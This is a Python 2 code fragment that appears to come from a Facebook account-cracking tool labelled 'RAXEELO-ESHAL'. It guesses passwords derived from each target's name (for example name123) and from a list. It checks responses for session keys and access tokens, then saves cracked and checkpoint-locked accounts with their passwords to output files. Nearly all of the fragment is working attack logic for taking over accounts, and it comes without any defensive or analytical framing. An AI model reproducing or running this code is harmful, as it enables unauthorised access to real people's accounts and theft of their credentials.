        ...
        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                ...
                if 'session_key' in respon.text and 'EAAA' in respon.text:
                    print '\r  \x1b[0;95m RAXEELO-ESHAL-OK ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  RAXEELO-ESHAL-OK ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'www.facebook.com' in respon.json()['error_msg']:
                    try:
                        ...
                        month = bulan[month]
                        print '\r\x1b[1;92m CP ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  RAXEELO-ESHAL-CP ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        graph = ' '
                    ...
                    print '\r\x1b[1;92m  RAXEELO-ESHAL-CP ' + uid + '|' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
        ...
        try:
            for asu in pw:
                ...
                if 'session_key' in respon.text and 'EAAA' in respon.text:
                    ...
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  RAXEELO-ESHAL-OK ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if 'www.facebook.com' in respon.json()['error_msg']:
                    ...
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  RAXEELO-ESHAL-CP ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
